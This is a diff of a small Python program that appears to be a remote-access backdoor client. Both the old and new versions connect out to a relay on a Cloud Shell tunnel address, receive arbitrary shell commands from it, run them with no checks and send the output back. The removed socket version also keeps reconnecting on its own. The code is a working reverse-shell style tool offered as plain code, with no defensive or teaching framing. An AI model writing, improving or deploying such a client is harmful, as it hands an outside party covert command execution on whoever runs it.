@@ -1,63 +1,25 @@
-import socket
-import threading
-import time
-import platform
+import websocket
+import json
 import subprocess
+import platform
+import time
 
-RELAY_HOST = "8080-cs-xxxxx.cloudshell.dev"
-RELAY_PORT = 443     # Cloud Shell tunnel
-SESSION_ID = "123456"
+CLIENT_ID = "client_001"
+RELAY = "wss://8080-XXXX.cloudshell.dev"
 
-def execute_command(cmd):
+def execute(cmd):
     if cmd == "PING":
         return "PONG"
+    return subprocess.getoutput(cmd)
 
-    elif cmd == "INFO":
-        return f"{platform.system()} | {platform.node()}"
+ws = websocket.create_connection(RELAY)
+ws.send(json.dumps({
+    "role": "client",
+    "id": CLIENT_ID
+}))
 
-    elif cmd == "TIME":
-        return time.ctime()
-
-    elif cmd.startswith("ECHO:"):
-        return cmd[5:]
-
-    else:
-        try:
-            return subprocess.check_output(cmd, shell=True, text=True)
-        except Exception as e:
-            return str(e)
-
-def listen(sock):
-    while True:
-        try:
-            cmd = sock.recv(1024).decode()
-            if not cmd:
-                break
-            print("[CMD]", cmd)
-            res = execute_command(cmd)
-            sock.send(res.encode())
-        except:
-            break
-
-def connect():
-    while True:
-        try:
-            s = socket.socket()
-            s.connect((RELAY_HOST, RELAY_PORT))
-            s.send(SESSION_ID.encode())
-            print("[✓] Connecté au relais")
-            return s
-        except:
-            print("[X] Relais OFF, retry...")
-            time.sleep(5)
-
-def main():
-    while True:
-        sock = connect()
-        t = threading.Thread(target=listen, args=(sock,), daemon=True)
-        t.start()
-        t.join()
-        time.sleep(1)
-
-if __name__ == "__main__":
-    main()
+while True:
+    msg = json.loads(ws.recv())
+    cmd = msg["data"]
+    result = execute(cmd)
+    ws.send(result)
